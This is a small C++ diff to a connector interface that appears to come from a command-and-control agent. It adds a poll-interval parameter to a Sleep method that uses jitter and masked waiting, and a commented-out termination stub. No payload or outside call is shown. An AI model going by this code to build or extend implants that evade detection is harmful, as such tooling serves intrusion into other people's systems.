@@ -19,11 +19,13 @@ public:
 	virtual int   RecvSize() = 0;
 	virtual void  RecvClear() = 0;
 
-	virtual void Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput)
+	virtual void Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput, DWORD pollIntervalMs = 0)
 	{
 		if (!hasOutput)
 			WaitMaskWithEvent(wakeupEvent, workingSleep, sleepDelay, jitter);
 	}
+
+	// virtual void SignalTermination() {}
 
 	virtual void CloseConnector() = 0;
 
